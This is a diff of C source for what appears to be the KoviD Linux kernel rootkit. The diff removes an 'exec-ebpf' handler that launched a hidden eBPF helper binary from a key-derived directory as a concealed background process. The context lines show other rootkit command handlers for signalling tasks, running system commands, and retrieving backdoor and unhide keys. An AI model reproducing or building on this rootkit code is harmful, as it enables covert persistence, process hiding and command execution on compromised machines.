@@ -451,10 +451,6 @@ enum {
 	Opt_signal_task_stop,
 	Opt_signal_task_cont,
 	Opt_signal_task_kill,
-#ifdef CONFIG_BPF
-	Opt_exec_epbf,
-#endif
-
 #ifdef DEBUG_RING_BUFFER
 	/**debug */
 	Opt_get_bdkey,
@@ -487,9 +483,6 @@ static const match_table_t tokens = {
 #ifdef DEBUG_RING_BUFFER
 	{ Opt_get_bdkey, "get-bdkey" },
 	{ Opt_get_unhidekey, "get-unhidekey" },
-#endif
-#ifdef CONFIG_BPF
-	{ Opt_exec_epbf, "exec-ebpf" },
 #endif
 	{ Opt_unknown, NULL }
 };
@@ -641,39 +634,6 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 				kv_run_system_command(cmd, false, false);
 			}
 		} break;
-#ifdef CONFIG_BPF
-		case Opt_exec_epbf: {
-			static char cmdPath[128] = { 0 };
-			snprintf(cmdPath, sizeof(cmdPath),
-				 "/usr/bin/0x%llx/ebpf-kovid",
-				 (unsigned long long)auto_ebpfhidenkey);
-
-			static char *cmd[] = { cmdPath, NULL, NULL };
-
-			char hideDir[128] = { 0 };
-			char hideDirEbpfJson[128] = { 0 };
-
-			snprintf(hideDir, sizeof(hideDir), "/usr/bin/0x%llx",
-				 (unsigned long long)auto_ebpfhidenkey);
-			snprintf(hideDirEbpfJson, sizeof(hideDirEbpfJson),
-				 "/tmp/0x%llx",
-				 (unsigned long long)auto_ebpfhidenkey);
-
-			// FIXME: This causes kernel crash. Investigate why.
-			// hide_path(hideDir);
-			// hide_path(hideDirEbpfJson);
-
-			/* Use the *detached* version so we don't block */
-			/* In addition, hide the process.*/
-			int ret = kv_run_system_command(cmd, true, true);
-			if (ret == 0) {
-				prinfo("KoviD: Launched ebpf-kovid in background.\n");
-			} else {
-				prinfo("KoviD: Failed to run ebpf-kovid, ret=%d\n",
-				       ret);
-			}
-		} break;
-#endif
 #ifdef DEBUG_RING_BUFFER
 		case Opt_get_bdkey:
 		case Opt_get_unhidekey: {
